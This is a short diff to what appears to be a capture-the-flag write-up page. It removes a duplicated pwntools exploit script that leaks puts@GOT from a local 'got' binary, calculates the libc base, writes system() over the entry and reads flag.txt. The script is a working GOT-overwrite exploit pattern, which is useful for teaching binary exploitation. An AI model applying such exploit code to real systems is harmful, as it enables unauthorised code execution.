@@ -133,44 +133,6 @@ io.pack(system)
 io.clean()
 io.sendline('cat flag.txt')
 success(io.clean())
-from pwn import *
-
-context.binary = e = ELF('got')
-
-print("puts@got is at ", hex(e.got.puts))
-
-# Start the process
-io = e.process()
-io.clean()
-
-# We have 28 bytes, and 4 of them will be dumped
-io.fit({
-	0: '/bin/sh\x00',
-	24: e.got.puts
-})
-
-# Receive data until we get the open colon
-io.recvuntil(b"(")
-
-# Receive exactly four bytes of leaked data
-got_puts = io.unpack()
-info("puts@GOT == %#x" % got_puts)
-io.clean()
-
-# Calculate the base address of libc so we can calculate system()
-libc = context.binary.libc
-libc.address = got_puts - libc.symbols.puts
-info("libc == %#x", libc.address)
-
-# Calculate system()
-system = libc.symbols.system
-io.pack(system)
-
-# Get a shell
-io.clean()
-io.sendline('cat flag.txt')
-success(io.clean())
-
 ```
 
 {{< /details >}}
